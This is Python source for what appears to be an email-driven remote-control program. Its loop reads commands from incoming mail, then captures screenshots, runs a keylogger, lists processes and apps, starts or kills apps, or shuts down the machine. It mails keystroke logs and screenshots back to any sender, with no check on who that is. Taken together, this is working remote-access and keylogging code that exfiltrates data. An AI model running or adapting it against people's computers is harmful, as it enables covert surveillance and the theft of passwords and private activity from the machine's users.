import EmailHandler as em
import KeyLogger as keyl
import ListApp as app
import ListProcess as proc
import ScreenShot
import Power
import time
import os

DEFAULT_KEYLOG_TIME = 300

# init
email = em.EmailHandler()
waitCounter = 0
idler = ['   ', '.  ', '.. ', '...']
# Main loop
while True:
    
    command = email.readLastestEmail()
    cmd = command[1].split()

    print(f'Waiting for next command{idler[waitCounter]}\r', end='')
    waitCounter = 0 if waitCounter == 3 else waitCounter + 1 
    
    result = ''
    image = None
    shutd = restart = logout = False

    if 'EMPTY' in cmd:
        continue
    os.system('cls')
    if cmd[0] == 'screenshot':
        result = 'Screenshot captured'
        image = ScreenShot.capture()

    elif cmd[0] == 'keylog':
        keylTime = DEFAULT_KEYLOG_TIME
        if '-t' in cmd:
            keylTime = int(cmd[cmd.index('-t') + 1])
        keylog = keyl.Keylogger(keylTime)
        print('Capturing...')
        keys = keylog.run()
        print('Finished')
        if '-both' in cmd:
            result += keys
            print(f'Log: {keylog.getLog()}')
            result += f'<br>Log: {keylog.getLog()}'
        elif '-l' in cmd:
            print(f'Log: {keylog.getLog()}')
            result += f'<br>Log: {keylog.getLog()}'
        else:
            result += keys

    elif cmd[0] == 'app':
        if cmd[1] == 'list':
            if '-all' in cmd:
                appList = app.ListAllApp(cmd)
            else:
                appList = app.ListApp(cmd)
            print('List sent')
            result += appList
        elif cmd[1] == '-end':
            app.StopApp(cmd[2])
            result = 'Stopped'
        else:
            app.OpenApp(cmd[2])
            result = 'Opened'

    elif cmd[0] == 'proc':
        if cmd[1] == 'list':
            procList = proc.ListGet()
            print(procList)
            result += procList

    elif cmd[0] == 'shutdown':
        shutd = True
        result = 'Shutdown'
    
    elif cmd[0] == 'restart':
        restart = True
        result = 'Restarted'
    
    elif cmd[0] == 'logout':
        logout = True
        result = 'Logged out'

    else:
        print('Error: Command not found')
        result = 'Error: Command not found'
    
    sender = command[2]
    if result != '':
        email.sendMail(sender, 'Your request has been executed', result, image)
    time.sleep(1)
    if shutd:
        Power.shutdown()
    elif restart:
        Power.restart()
    elif logout:
        Power.logout()


